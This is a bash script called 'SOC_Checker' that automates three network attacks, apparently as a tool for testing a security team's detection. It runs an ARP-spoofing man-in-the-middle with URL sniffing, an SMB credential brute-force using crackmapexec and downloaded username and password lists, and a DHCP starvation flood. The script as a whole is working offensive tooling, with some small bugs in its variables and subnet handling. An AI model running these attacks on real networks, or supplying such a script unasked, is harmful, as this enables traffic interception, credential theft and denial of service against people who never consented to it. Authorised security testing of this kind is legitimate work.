#!/bin/bash 
# SOC_Checker is an automatic attack system. 
# Might be used to check SOC team's vigilance. Available attacks - Men in the Midlle, SMB Brute-Force, DHCP #starvation. 

# Set HOME variable to current directory
HOME=$(pwd)

# Get info from the user: network range to attack, output directory name
function START()
{  
figlet "Welcome to SOC Checker"
read -p "[→] Please enter network range:" RANGE
read -p "[→] Please enter a name for the output directory:" DIR
mkdir -p $HOME/Checker/$DIR
echo "[*] Logs will be saved in $HOME/Checker/$DIR"
touch $HOME/Checker/$DIR/log.txt
}
START



# function for Men in the Middle attack. Arpspoof and Urlsnarf are used.
function MITM()
{
# Scan the network for live hosts. Nmap is used. 
echo "Getting ready: looking for live hosts"
gateway=$(ip r | grep default | awk '{print $3}')
myip=$(ifconfig | grep broadcast | awk '{print $2}')

nmap -sn -T5 $RANGE -oG $HOME/Checker/$DIR/nmap_scan.txt > /dev/null 2>&1
cat $HOME/Checker/$DIR/nmap_scan.txt | grep Up | grep -v $gateway | grep -v $myip | awk '{print $2}' > $HOME/Checker/$DIR/live_hosts.txt

#Check if any hosts were found. If not - inform the user and go back to the Main Menu.
if 
grep -q Up $HOME/Checker/$DIR/nmap_scan.txt
then
echo "Found the following hosts:"
count=0
while read -r host; do
    count=$((count+1))
    echo "$count. $host"
done < $HOME/Checker/$DIR/live_hosts.txt
echo "$((count+1)). Random choice"
echo ""

# function that prompts the user to choose target IP. Option to select random choice
function TARGET_MITM
{
read -p "Enter the number of the target IP (or choose 'Random choice'): " choice

# Validate the input and select target IP
if [ "$choice" -gt 0 ] && [ "$choice" -le "$count" ]; then
    target_mitm=$(sed "${choice}q;d" $HOME/Checker/$DIR/live_hosts.txt)
elif [ "$choice" -eq "$((count+1))" ]; then
    random_choice_mitm=$(( (RANDOM % count) + 1 ))
    target_mitm=$(sed "${random_choice_mitm}q;d" $HOME/Checker/$DIR/live_hosts.txt)
else
    echo "Invalid choice. Try again."
    TARGET_MITM
fi
}
TARGET_MITM

# Display the selected or randomly chosen IP
echo "[*] Target IP is: $target_mitm"
echo "[*] Default Gateway is: $gateway"
else
echo "No live hosts were found"
MENU
fi

# Check if dsniff package containing arpspoof and urlsnarf is already installed. If yes - proceed, if not - inform the user and install.
if ! command -v dsniff  > /dev/null 2>&1
then
echo "[!] Dsniff package not found. Installing..."
sudo apt-get install -y dsniff
else
:
fi

# Switch to root to allow routing (by default routing in Linux is disabled). Then go back to regular user.
function ENABLE()
{
	sudo su -c "echo 1 > /proc/sys/net/ipv4/ip_forward; cat /proc/sys/net/ipv4/ip_forward"
	echo "[+] Routing enabled"
}
ENABLE
 
# Log start time, target ip
# Start the attack
echo ""
echo "[*] Starting..."
sudo arpspoof -t $target_mitm $gateway > /dev/null 2>&1 &
sudo arpspoof -t $gateway $target_mitm > /dev/null 2>&1 &
# Log attack type, start time, target ip
echo -e "Men in the Middle\nStart: $(date)\nTarget: $target_mitm" >> $HOME/Checker/$DIR/log.txt
echo "[+] MITM attack initiated. Arpspoofing running in background." 

echo "[+] Starting Urlsnarf to monitor...Press S at any moment to stop the attack"
sudo urlsnarf -i eth0 &

# While loop to wait for the user to press "S" to stop the attack
while true; 
do
read -n1 input
	if [ $input == "S" ]
		then 
		sudo pkill arpspoof
		sudo pkill urlsnarf
		break
	fi
done
# Log attack end time 
echo "End: $(date)" >> $HOME/Checker/$DIR/log.txt
echo ""
echo "Attack stopped"
# Clean up - remove irrelevant files 
rm $HOME/Checker/$DIR/live_hosts.txt
rm $HOME/Checker/$DIR/nmap_scan.txt 


# Switch to root to disable routing once the user has stopped the attack. Then go back to regular user  
function DISABLE()
{
	sudo su -c "echo 0 > /proc/sys/net/ipv4/ip_forward; cat /proc/sys/net/ipv4/ip_forward"
	echo "[+] Routing disabled to restore default settings"
}
DISABLE
MENU
}


function SMB()
{
# Scan the network for hosts that have port 445 (SMB) open
echo ""
echo "[*] Scanning for hosts running SMB service"
nmap -Pn -p445 192.168.49.0/24 -oG $HOME/Checker/$DIR/nmap.txt > /dev/null 2>&1
cat $HOME/Checker/$DIR/nmap.txt | grep open | awk '{print $2}' > $HOME/Checker/$DIR/smb_hosts.txt

#Check if any hosts were found
if 
grep -q open $HOME/Checker/$DIR/nmap.txt
then
echo "Found the following hosts:"
count=0
while read -r host; do
    count=$((count+1))
    echo "$count. $host"
done < $HOME/Checker/$DIR/smb_hosts.txt
echo "$((count+1)). Random choice"

function TARGET_SMB
{
read -p "Enter the number of the target IP (or choose 'Random choice'): " choice

# Validate the input and select target IP
if [ "$choice" -gt 0 ] && [ "$choice" -le "$count" ]; then
    target_smb=$(sed "${choice}q;d" $HOME/Checker/$DIR/smb_hosts.txt)
elif [ "$choice" -eq "$((count+1))" ]; then
    random_choice=$(( (RANDOM % count) + 1 ))
    target_smb=$(sed "${random_choice}q;d" $HOME/Checker/$DIR/smb_hosts.txt)
else
    echo "Invalid choice. Try again."
    TARGET_SMB
fi
}
TARGET_SMB

# Display the selected target IP
echo "Selected IP: $target_smb"
else
echo "No hosts with port 445 open were found. Please select different attack"
MENU
fi

# Function to prompt the user to submit users list. If no list is uploaded default to most common usernames list.  
function USERS
{
read -p "[→] Do you want to submit users list? [y/n]" users
case $users in
y)
echo "[→] Please upload users list into $HOME/Checker/$DIR"
read -p "[→] Once uploaded, enter file name:" userslist
# Checking if userslist was submitted correctly
if [ -f $HOME/Checker/$DIR/$userslist ] 
then
echo "[+] You submitted: $userslist"
else 
echo "[-] Error: File not found. Please check file path and try again" 
USERS
fi
;;
n)
echo "[*] Downloading Common Usernames list from GitHub (10177 names)" 
wget -P $HOME/Checker/$DIR https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt > /dev/null 2>&1
userslist=$HOME/Checker/$DIR/names.txt
echo "[+] Done"
;;
*)
echo "[-] Invalid input. Try again"
USERS
esac

}
USERS

#function to prompt the user to submit password list. If no list is uploaded, default to 10 thousand most common passwords
function PASSWD 
{
read -p "[→] Do you want to submit passwords list? [y/n]" pass
case $pass in
y)
echo "[→] Please upload passwords list into $HOME/Checker/$DIR"
read -p "[→] Once uploaded, enter file name:" passlist
# Checking if password list was submitted correctly
if [ -f $HOME/Checker/$DIR/$passlist ] 
then
echo "[+] You submitted: $passlist"
else 
echo "[-] Error: File not found. Please check file path and try again" 
PASSWD
fi
;;
n)
echo "[*] Downloading Common passwords list from GitHub (10000 passwords)" 
wget -P $HOME/Checker/$DIR https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt > /dev/null 2>&1
passlist=$HOME/Checker/$DIR/10k-most-common.txt
echo "[+] Done"
;;
*)
echo "[-] Invalid input. Try again"
PASSWD
esac	
	
}
PASSWD

function BRUTE
{
	echo "[*] Starting SMB Brute-Force Attack"
	echo -e "SMB Brute-Force\nStart: $(date)\nTarget: $target_ip" >> $HOME/Checker/$DIR/log.txt
	crackmapexec smb $target_smb -u $userslist -p $passlist --continue-on-success > $HOME/Checker/$DIR/credentials_temp.txt
	cat $HOME/Checker/$DIR/credentials_temp.txt | grep "[+]" >> $HOME/Checker/$DIR/credentials.txt
	# Log attack results
	echo -e "Identified credentials:" >> $HOME/Checker/$DIR/log.txt
	cat $HOME/Checker/$DIR/credentials.txt >> $HOME/Checker/$DIR/log.txt
	echo "[+] Identified credentials:"
	cat $HOME/Checker/$DIR/credentials.txt
	echo "[+] Attack completed"
	# Log attack end
	echo "End: $(date)" >> $HOME/Checker/$DIR/log.txt
	# Clean up - delete irrelevant files
	rm $HOME/Checker/$DIR/credentials_temp.txt
	rm $HOME/Checker/$DIR/credentials.txt
	
	if [ -f $HOME/Checker/$DIR/10k-most-common.txt ]
	then 
	rm $HOME/Checker/$DIR/10k-most-common.txt
	else
	:
	fi
	
	if [ -f $HOME/Checker/$DIR/names.txt ]
	then
	rm $HOME/Checker/$DIR/names.txt
	else 
	:
	fi
	
	if [ -f $HOME/Checker/$DIR/$passlist ]
	then
	rm $HOME/Checker/$DIR/$passlist
	else
	:
	fi
	
	if [ -f $HOME/Checker/$DIR/$userslist ]
	then
	rm $HOME/Checker/$DIR/$userslist
    else
    :
    fi
	MENU
}
BRUTE
}


function DHCP()
{

# Check if dhcpstarv tool is already installed. If yes - proceed, if not - inform the user and install.
if ! command -v dhcpstarv  > /dev/null 2>&1
then
echo "[!] Dhcpstarv tool not found. Installing..."
sudo apt-get install -y dhcpstarv
else
:
fi

echo ""
echo "[*] Starting...Press S at any moment to stop the attack"
# Log attack type, start time
echo -e "DHCP starvation Attack\nStart: $(date)\nTarget: $target" >> $HOME/Checker/$DIR/log.txt
sudo dhcpstarv -i eth0 &

while true; 
do
read -n1 input
	if [ $input == "S" ]
		then 
		sudo pkill dhcpstarv
		break
	fi
done
# Log attack end time 
echo "End: $(date)" >> $HOME/Checker/$DIR/log.txt
echo "Attack stopped"
MENU
}





# Function to choose attack randomly 
function RANDOM_ATTACK()
{
	#Generate a random number between 1 and 3
	random_number=$((RANDOM % 3 + 1))
	case $random_number in
	1)
	echo ""
	echo "[*] Randomly chosen attack: 1 - Men in the Middle"
	MITM
	;;
	
	2)
	echo ""
	echo "[*] Randomly chosen attack: 2 - SMB Brute-Force"
	SMB
	;;
	
	3)
	echo ""
	echo "[*] Randomly chosen attack: 2 - DHCP starvation"
	DHCP
	;;
	esac
}

#Function to display the menu and read user's choice. Short attacks description. 
function MENU()
{
	echo ""
	echo "[*] ATTACKS:"
	echo "[→] 1 - Men in the Middle Attack - intercept data exchange between the user and router."
	echo "[→] 2 - SMB Brute-Force Attack - exploit SMB protocol weakness to brute-force user credentials."
	echo "[→] 3 - DHCP starvation - flood a DHCP server with request packets until it exhausts its scope of IP addresses."
	echo "[→] 4 - Choose attack randomly"
	echo "[→] 5 - Exit"
	read -p "Enter your choice (1-5): " attack
case $attack in 
	1)
	echo "[*] You selected Men in the Middle Attack"
	MITM
	;;
	2)
	echo ""
	echo "[*] You selected SMB Brute-Force Attack"
	SMB
	;;
	
	3)
	echo ""
	echo "[*] You selected DHCP starvation Attack"
	DHCP
	;;
	
	4)
	RANDOM_ATTACK
	;;
	
	5)
	echo ""
	echo "[*] Log is saved in $HOME/Checker/$DIR. Exiting..."
	exit
	;;
	*) 
	echo""
	echo "[-] Invalid choice, please try again"
	MENU
	;;
esac		
}

MENU

 
